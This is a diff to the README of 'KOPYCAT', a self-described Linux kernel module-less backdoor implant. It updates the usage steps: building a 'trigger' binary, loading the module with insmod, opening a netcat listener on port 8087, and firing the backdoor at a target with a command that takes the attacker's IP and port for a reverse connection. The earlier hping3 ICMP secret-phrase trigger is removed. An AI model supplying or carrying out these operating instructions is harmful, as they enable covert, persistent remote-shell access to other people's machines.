@@ -6,6 +6,7 @@ KOPYCAT - Linux Kernel module-less implant (backdoor)
 
 ~~~
 $ make
+$ make trigger
 $ sudo insmod kopycat.ko
 insmod: ERROR: could not insert module kopycat.ko: Inappropriate ioctl for device
 $ lsmod | grep kopycat
@@ -19,7 +20,7 @@ $ nc -l 8087
 
 Trigger the backdoor by sending ICMP packet with secret phrase:
 ~~~
-$ sudo hping3 -c 1 -j -1 -e black-magic-test <target>
+$ sudo ./trigger <target_ip> <reversed_ip> <reversed_port>
 ~~~
 
 # Author
